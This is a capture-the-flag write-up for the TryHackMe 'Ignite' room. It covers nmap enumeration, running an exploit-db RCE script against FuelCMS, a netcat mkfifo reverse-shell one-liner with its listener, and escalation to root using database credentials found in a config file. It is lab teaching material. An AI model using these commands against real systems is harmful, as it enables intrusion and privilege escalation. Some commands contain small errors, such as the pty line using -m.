# IGNITE


* ### This is a direct walk-through to the flag. Hopping that you have given your best before referring to this write-up
* ### Assuming that your are using Attack-box or conntected to VPN. If not, do refer to [vpn_connection](https://github.com/shybu9/TRY-HACK-ME/tree/main/OPEN-VPN-CONNECTION "OPEN VPN CONNECTION")
*  ### Do follow this page through out the line to void confusion.

<br>

 ![ignite intro](https://user-images.githubusercontent.com/112984045/201496846-a4648f1f-d16d-40ff-a74c-a7459a003f48.png)

~ the IP will be given once you join the room and Start Machine succefully after connecting to OPEN-VPN
 
 ## ENUMERATION :

 * For ENUMERATION we use nmap tool which come by default in kali linux.
 <br>command : 
 ```bash
 nmap -sVC -T4 -v <IP> 
 ```
 ![ignite nmap](https://user-images.githubusercontent.com/112984045/201496856-8a504985-ce84-4cae-9d0a-791b45334553.png)
 <br>~ we can add -v argument for more verbose output.
 
 * I usually perform one more scan by using my personal tool : [port-scanner](https://github.com/shybu9/port-Scanner)
![ignite portscanner](https://user-images.githubusercontent.com/112984045/201496953-694e271e-387e-4d9a-8d15-99ab6096269d.png)<br>
    ~ I prefer this tool because of its speed as you can see it just took 858 seconds for scanning 65535 ports.Even still some improvements to be done
 
 ### ANALYSING BOTH SCANS :
 * number of OPEN PORTS : 1
 * PORT NUMBER : 80
 * OPERATING SYSTEM : Uinux, Linux
 * service running on PORT 80 : http
 
 * As http port is open go for it
 ```bash
 http://<ip>
 ```
 ![fuelpageintro](https://user-images.githubusercontent.com/112984045/213106555-bd91dfc1-b149-4da2-b632-dc1e6571e4bc.png)
 
 ```bash
 http://<ip>/robots.txt
 ```
 
![fuel robots](https://user-images.githubusercontent.com/112984045/213106717-fcccaf79-2b54-4176-9938-46ae0fcb781f.png)
<br>
* After having a look at both the pages we found that there is another page '/fuel/' <br>
```bash
http://<ip>/fuel/
```

![fuelloginpage](https://user-images.githubusercontent.com/112984045/213107610-7d16024d-cdaa-49f9-86de-4c8a1db8a945.png)
<br>

* The credentials for login page are also given in main page <br>
 ![fuel admin](https://user-images.githubusercontent.com/112984045/213107981-c23c7512-3e60-4bd5-becb-3bed82f39968.png)
<br>
* There is nothing much intresting on the domain. 
<br>
* There are some exploits found in exploit-DB, from which i have downloaded the latest RCE
<br>

[DOWNLOAD_LINK](https://www.exploit-db.com/exploits/50477)<br>
 
![fuel exploitdb](https://user-images.githubusercontent.com/112984045/213108905-c8396790-41a3-4af4-89cc-301816119d3d.png)
<br>
* Run the exploit after giving the permissions
```bash
python3 50477 -u http://<ip>/
```

![fuel exploited](https://user-images.githubusercontent.com/112984045/213109382-0f4fff68-a420-4768-915d-dd02e1b06bba.png)
<br>
* Thought to take netcat revershell from this:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 444 >/tmp/f
```

![fuel shell1](https://user-images.githubusercontent.com/112984045/213110490-22bd15b6-1167-4191-acb1-e48ffad3b1ac.png)

* Also start the nc on another terminal for listning to same port.
```bash
nc -lvnp 444
```

![fuel nc flag1](https://user-images.githubusercontent.com/112984045/213109553-ef02d15c-3519-4f8d-a9ea-f98b82694e64.png)

* There we got the user flag as well

## PRIV-ESC


* Tried a lot with linpeas but got nothing big to move further.
* Just started moving to each directory, after a while found a directory named fuel.
```bash
cd /var/www/html/fuel
```

![fuel setpython fuel](https://user-images.githubusercontent.com/112984045/213112896-4ad1f7de-cd28-4169-a32b-31b0ffe9f6c5.png)

```bash
python -m 'import pty;pty.spawn("/bin/bash")'
```

* Above python cmd will make the shell more versatile and easy to use.
<br>
* For there after going through some more directories, Finally got database file in a directory 

```bash
cd /var/www/html/fuel/application/config
```

* Then cat the file in which contains the root credentials.

![fuel rootpassword](https://user-images.githubusercontent.com/112984045/213113928-a3a313d0-dd12-400a-a5c2-5bd88e79376b.png)

* Using those credentials just switch to root user
```bash
su root
```

* Move to root directory and look for root flag
```bash
cd /root
```
![fuel rootflag](https://user-images.githubusercontent.com/112984045/213114366-904da23f-2a9c-49c8-9fc6-b62404ae2bd8.png)

### SUBMIT THE FLAGS <br>
### DO WRITE TO shy.bu9@gmail.com


